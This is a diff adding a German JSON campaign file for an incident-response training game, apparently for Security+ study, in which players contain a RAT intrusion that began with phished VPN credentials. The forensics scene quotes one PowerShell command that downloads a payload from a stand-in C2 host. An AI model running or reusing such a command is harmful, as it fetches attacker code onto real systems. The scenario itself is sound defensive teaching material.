@@ -1,0 +1,371 @@
+{
+  "campaign_id": "einbruch_im_netz",
+  "title": "Einbruch im Netz",
+  "description": "Dienstag 03:47 Uhr. 847 fehlgeschlagene Logins in 12 Minuten. Das ist kein normaler Dienstag.",
+  "duration_minutes": 60,
+  "difficulty": "advanced",
+  "focus_areas": ["security_plus"],
+  "character_recommendations": ["security", "sysadmin"],
+  "characters": {
+    "architect": {
+      "name": "Alex \"The Architect\" Neumann",
+      "avatar": "👨‍💻",
+      "skill_bonus_pools": ["routing", "vlan", "subnetting", "topology"],
+      "skill_penalty_pools": ["security", "incident_response"]
+    },
+    "security": {
+      "name": "Sarah \"Firewall\" Okonkwo",
+      "avatar": "👩‍💻",
+      "skill_bonus_pools": ["security", "incident_response", "firewall", "forensics"],
+      "skill_penalty_pools": ["routing", "vlan"]
+    },
+    "sysadmin": {
+      "name": "Kai \"Root\" Lindström",
+      "avatar": "🧔",
+      "skill_bonus_pools": ["linux", "dns", "troubleshooting", "forensics"],
+      "skill_penalty_pools": ["wireless", "wlan"]
+    },
+    "helpdesk": {
+      "name": "Mia \"Helpdesk\" Torres",
+      "avatar": "👩‍🎧",
+      "skill_bonus_pools": ["troubleshooting", "hardware", "a_plus"],
+      "skill_penalty_pools": ["security", "incident_response", "forensics"]
+    }
+  },
+  "npcs": {
+    "dr_weber": {
+      "name": "Dr. Margarethe Weber",
+      "role": "CEO",
+      "avatar": "👔"
+    },
+    "jens_bug": {
+      "name": "Jens \"Bug\" Hoffmann",
+      "role": "Ehemaliger Admin",
+      "avatar": "😰"
+    },
+    "nova": {
+      "name": "NOVA",
+      "role": "KI-Assistent",
+      "avatar": "🤖"
+    }
+  },
+  "scenes": [
+    {
+      "id": "s1_incident_detection",
+      "title": "Incident Detection",
+      "narrative": "Dienstag, 03:47 Uhr. Dein Pager geht los. NOVA sendet eine automatische Warnung: 'Ungewöhnliche Netzwerkaktivität — 847 fehlgeschlagene Login-Versuche in 12 Minuten. Quelle: intern.' Du loggst dich remote ein. Das SIEM-Dashboard leuchtet rot. Drei Alarme gleichzeitig: Brute-Force auf den File-Server, unbekannter Prozess auf dem Domain Controller, und ein verdächtiger DNS-Query zu c2.evil-domain.xyz. Klassisches Lateral Movement.",
+      "image": "scene_siem_dashboard.png",
+      "animation_in": "mission_start",
+      "npc_dialog": {
+        "speaker": "nova",
+        "text": "Drei gleichzeitige Alarme. Brute-Force, verdächtiger Prozess, und C2-Kommunikation. Ich empfehle sofortiges Handeln nach Priorität.",
+        "portrait": "npc_nova"
+      },
+      "choices": [
+        {
+          "id": "c1_isolate_dc",
+          "text": "Sofort den Domain Controller isolieren",
+          "icon": "🔒",
+          "skill_check": {
+            "pool_filter": "incident_response",
+            "question_count": 3,
+            "pass_threshold": 2,
+            "character_adjustments": {
+              "security": {"difficulty_modifier": -1},
+              "sysadmin": {"difficulty_modifier": 0},
+              "architect": {"difficulty_modifier": 1},
+              "helpdesk": {"difficulty_modifier": 1}
+            }
+          },
+          "success_scene": "s2_containment",
+          "partial_scene": "s2_containment",
+          "fail_scene": "s2_containment_fail"
+        },
+        {
+          "id": "c1_evidence_first",
+          "text": "Erst Evidence sammeln, dann isolieren",
+          "icon": "🔍",
+          "skill_check": {
+            "pool_filter": "incident_response",
+            "question_count": 3,
+            "pass_threshold": 2,
+            "character_adjustments": {
+              "security": {"difficulty_modifier": -1},
+              "sysadmin": {"difficulty_modifier": -1},
+              "architect": {"difficulty_modifier": 1},
+              "helpdesk": {"difficulty_modifier": 1}
+            }
+          },
+          "success_scene": "s2_containment",
+          "partial_scene": "s2_containment",
+          "fail_scene": "s2_containment_fail"
+        },
+        {
+          "id": "c1_dns_analysis",
+          "text": "Den DNS-Traffic analysieren — wohin geht die Verbindung?",
+          "icon": "🌐",
+          "skill_check": {
+            "pool_filter": "security",
+            "question_count": 3,
+            "pass_threshold": 2,
+            "character_adjustments": {
+              "security": {"difficulty_modifier": -1},
+              "sysadmin": {"difficulty_modifier": 0},
+              "architect": {"difficulty_modifier": 0},
+              "helpdesk": {"difficulty_modifier": 1}
+            }
+          },
+          "success_scene": "s2_containment",
+          "partial_scene": "s2_containment",
+          "fail_scene": "s2_containment_fail"
+        }
+      ],
+      "simulation": null
+    },
+    {
+      "id": "s2_containment",
+      "title": "Containment",
+      "narrative": "Du entscheidest dich für Containment. Der infizierte Server muss isoliert werden — aber nicht ausgeschaltet (Beweise im RAM!). Du konfigurierst eine Firewall-Regel: Block all traffic from 10.0.2.15 except to your forensics workstation. Der Server ist jetzt isoliert aber noch aktiv. Im RAM schlummern wertvolle Spuren.",
+      "image": "scene_firewall_config.png",
+      "npc_dialog": {
+        "speaker": "nova",
+        "text": "Server isoliert. RAM-Dump läuft. Wichtig: Beweise sichern bevor Strom weg. Chain of Custody beachten.",
+        "portrait": "npc_nova"
+      },
+      "choices": [
+        {
+          "id": "c2_firewall_rules",
+          "text": "Firewall-Regeln für Network Segmentation konfigurieren",
+          "icon": "🔥",
+          "skill_check": {
+            "pool_filter": "firewall",
+            "question_count": 3,
+            "pass_threshold": 2,
+            "character_adjustments": {
+              "security": {"difficulty_modifier": -1},
+              "architect": {"difficulty_modifier": 0},
+              "sysadmin": {"difficulty_modifier": 0},
+              "helpdesk": {"difficulty_modifier": 1}
+            }
+          },
+          "success_scene": "s3_forensics",
+          "partial_scene": "s3_forensics",
+          "fail_scene": "s3_forensics"
+        }
+      ],
+      "simulation": null
+    },
+    {
+      "id": "s2_containment_fail",
+      "title": "Zu langsam",
+      "narrative": "Die Reaktionszeit war zu hoch. Während du noch überlegst, verbreitet sich der Angreifer weiter im Netz. NOVA meldet: 'Weitere 3 Systeme kompromittiert.' Es ist noch nicht zu spät — aber du musst jetzt handeln.",
+      "image": "scene_siem_dashboard.png",
+      "npc_dialog": {
+        "speaker": "nova",
+        "text": "Lateral Movement erkannt. 3 weitere Systeme betroffen. Sofortiges Containment erforderlich — jede Sekunde zählt.",
+        "portrait": "npc_nova"
+      },
+      "choices": [
+        {
+          "id": "c2_emergency_isolate",
+          "text": "Notfall-Isolation: Alle betroffenen Segmente abschneiden",
+          "icon": "⚡",
+          "skill_check": {
+            "pool_filter": "incident_response",
+            "question_count": 2,
+            "pass_threshold": 1,
+            "character_adjustments": {}
+          },
+          "success_scene": "s3_forensics",
+          "partial_scene": "s3_forensics",
+          "fail_scene": "s3_forensics"
+        }
+      ],
+      "simulation": null
+    },
+    {
+      "id": "s3_forensics",
+      "title": "Forensik",
+      "narrative": "Auf dem infizierten Server findest du: Eine PowerShell-History mit 'Invoke-WebRequest -Uri http://c2.evil-domain.xyz/payload.ps1'. Die Datei wurde am Freitag um 22:15 heruntergeladen. Genau die Zeit als 'der IT-Typ' im Gebäude war. Du sammelst Beweise — systematisch, mit Chain of Custody.",
+      "image": "scene_forensics_terminal.png",
+      "npc_dialog": {
+        "speaker": "jens_bug",
+        "text": "Das war ich nicht... ich meine, ich war zwar da, aber ich hab nur ein Update gemacht. Diese Datei — die kenne ich nicht.",
+        "portrait": "npc_jens"
+      },
+      "choices": [
+        {
+          "id": "c3_malware_analysis",
+          "text": "Malware-Typ identifizieren und klassifizieren",
+          "icon": "🦠",
+          "skill_check": {
+            "pool_filter": "security",
+            "question_count": 4,
+            "pass_threshold": 3,
+            "character_adjustments": {
+              "security": {"difficulty_modifier": -1},
+              "sysadmin": {"difficulty_modifier": 0},
+              "architect": {"difficulty_modifier": 1},
+              "helpdesk": {"difficulty_modifier": 1}
+            }
+          },
+          "success_scene": "s4_eradication",
+          "partial_scene": "s4_eradication",
+          "fail_scene": "s4_eradication"
+        }
+      ],
+      "simulation": {
+        "type": "cli_analysis",
+        "pbq_question_id": null,
+        "description": "Log-Analyse: Firewall und IDS Logs auswerten um den Angriffspfad zu rekonstruieren"
+      }
+    },
+    {
+      "id": "s4_eradication",
+      "title": "Eradication",
+      "narrative": "Du hast die Malware identifiziert: Ein Remote Access Trojan (RAT) der über einen kompromittierten VPN-Zugang eingeschleust wurde. Der Angreifer hatte Jens' VPN-Credentials — er wurde Opfer einer Phishing-Mail: 'Ihr VPN-Zugang muss aktualisiert werden — klicken Sie hier.' Eine täuschend echte Fälschung.",
+      "image": "scene_phishing_comparison.png",
+      "npc_dialog": {
+        "speaker": "jens_bug",
+        "text": "Oh Gott... die Mail sah so echt aus. Ich dachte das wäre von der IT-Abteilung. Tut mir so leid.",
+        "portrait": "npc_jens"
+      },
+      "choices": [
+        {
+          "id": "c4_mfa_rollout",
+          "text": "MFA für alle VPN-Zugänge sofort aktivieren",
+          "icon": "🔑",
+          "skill_check": {
+            "pool_filter": "security",
+            "question_count": 3,
+            "pass_threshold": 2,
+            "character_adjustments": {
+              "security": {"difficulty_modifier": -1},
+              "sysadmin": {"difficulty_modifier": 0},
+              "architect": {"difficulty_modifier": 0},
+              "helpdesk": {"difficulty_modifier": 0}
+            }
+          },
+          "success_scene": "s5_recovery_hardening",
+          "partial_scene": "s5_recovery_hardening",
+          "fail_scene": "s5_recovery_hardening"
+        },
+        {
+          "id": "c4_credential_rotation",
+          "text": "Alle Credentials sofort rotieren + Jens' Zugang sperren",
+          "icon": "🔄",
+          "skill_check": {
+            "pool_filter": "security",
+            "question_count": 2,
+            "pass_threshold": 1,
+            "character_adjustments": {
+              "security": {"difficulty_modifier": -1}
+            }
+          },
+          "success_scene": "s5_recovery_hardening",
+          "partial_scene": "s5_recovery_hardening",
+          "fail_scene": "s5_recovery_hardening"
+        }
+      ],
+      "simulation": null
+    },
+    {
+      "id": "s5_recovery_hardening",
+      "title": "Recovery und Hardening",
+      "narrative": "Das Netzwerk ist sauber. Jetzt muss sichergestellt werden dass es nicht nochmal passiert. NOVA zeigt eine Checkliste: MFA einrichten, VPN-Zugänge rotieren, IDS-Regeln aktualisieren, Security Awareness Training planen. Du musst die kritischsten Maßnahmen zuerst umsetzen.",
+      "image": "scene_security_hardening.png",
+      "npc_dialog": {
+        "speaker": "dr_weber",
+        "text": "Was kostet das alles? Und wie lange bis wir wieder sicher sind? Ich brauche Zahlen.",
+        "portrait": "npc_weber"
+      },
+      "choices": [
+        {
+          "id": "c5_full_hardening",
+          "text": "Vollständiges Hardening-Programm umsetzen",
+          "icon": "🛡️",
+          "skill_check": {
+            "pool_filter": "security",
+            "question_count": 4,
+            "pass_threshold": 3,
+            "character_adjustments": {
+              "security": {"difficulty_modifier": -1},
+              "sysadmin": {"difficulty_modifier": 0},
+              "architect": {"difficulty_modifier": 0},
+              "helpdesk": {"difficulty_modifier": 1}
+            }
+          },
+          "success_scene": "epilog_success",
+          "partial_scene": "epilog_partial",
+          "fail_scene": "epilog_partial"
+        }
+      ],
+      "simulation": {
+        "type": "network_device_placement",
+        "pbq_question_id": null,
+        "description": "Platziere Firewall, IDS/IPS und VPN-Concentrator korrekt im Netzwerk-Design"
+      }
+    },
+    {
+      "id": "epilog_success",
+      "title": "Incident Closed",
+      "narrative": "Mittwoch, 09:00 Uhr. Du präsentierst Dr. Weber den Incident Report. Sie ist beeindruckt: 'Wie können wir das verhindern?' Du antwortest: 'Awareness Training, MFA für alle, und ein besseres SIEM.' Sie nickt: 'Machen Sie das.' Jens entschuldigt sich — und fragt ob er am Security-Training teilnehmen darf. NOVA: 'Incident Response Zeit: 5h 13min. Schaden: minimal. Sehr gut.'",
+      "image": "scene_victory.png",
+      "animation_in": "campaign_complete",
+      "npc_dialog": {
+        "speaker": "nova",
+        "text": "Incident geschlossen. Alle Systeme sauber. Deine Incident Response war lehrbuchmäßig. Empfehlung: Lessons Learned dokumentieren.",
+        "portrait": "npc_nova"
+      },
+      "choices": [],
+      "simulation": null,
+      "is_epilog": true,
+      "epilog_type": "success"
+    },
+    {
+      "id": "epilog_partial",
+      "title": "Kontrolle wiederhergestellt",
+      "narrative": "Das Schlimmste ist verhindert. Aber nicht alle Systeme konnten vollständig gerettet werden. Dr. Weber ist erleichtert aber besorgt. NOVA: 'Nächstes Mal: Incident Response Plan vorher schreiben, nicht während des Incidents.' Jens hat das Security-Training bereits gebucht.",
+      "image": "scene_partial_victory.png",
+      "npc_dialog": {
+        "speaker": "nova",
+        "text": "Angriff abgewehrt. Drei Verbesserungspunkte für den nächsten Incident: 1) Faster Containment 2) Pre-approved Playbooks 3) MFA von Anfang an.",
+        "portrait": "npc_nova"
+      },
+      "choices": [],
+      "simulation": null,
+      "is_epilog": true,
+      "epilog_type": "partial"
+    },
+    {
+      "id": "epilog_fail",
+      "title": "Gelernt aus dem Chaos",
+      "narrative": "Der Angriff hat mehr Schaden angerichtet als nötig. Aber niemand wurde entlassen — Fehler im Incident Response sind Lernchancen. NOVA generiert einen detaillierten Post-Mortem Report. Dr. Weber: 'Nächstes Mal besser.' Das ist alles was zählt.",
+      "image": "scene_partial_victory.png",
+      "npc_dialog": {
+        "speaker": "nova",
+        "text": "Post-Mortem Report erstellt. 7 Verbesserungspotenziale identifiziert. Ein Incident der gut dokumentiert wird macht das Team stärker.",
+        "portrait": "npc_nova"
+      },
+      "choices": [],
+      "simulation": null,
+      "is_epilog": true,
+      "epilog_type": "fail"
+    }
+  ],
+  "epilog": {
+    "success": {
+      "narrative": "Mittwoch, 09:00 Uhr. Dr. Weber liest den Incident Report. 'Wie können wir das verhindern?' — 'MFA, Awareness Training, besseres SIEM.' Sie nickt. NOVA: 'Incident closed. Response Time: 5h 13min. Schaden: minimal.'",
+      "image": "scene_victory.png",
+      "animation": "campaign_complete"
+    },
+    "partial": {
+      "narrative": "Das Schlimmste ist verhindert. NOVA zeigt drei Verbesserungspunkte: Faster Containment, Pre-approved Playbooks, MFA von Anfang an. Jens bucht das Security-Training noch heute.",
+      "image": "scene_partial_victory.png"
+    },
+    "fail": {
+      "narrative": "Der Angriff hat Spuren hinterlassen. Aber der Post-Mortem Report wird das Team stärker machen. Incident Response ist eine Fähigkeit die man nur durch Übung lernt.",
+      "image": "scene_partial_victory.png"
+    }
+  }
+}
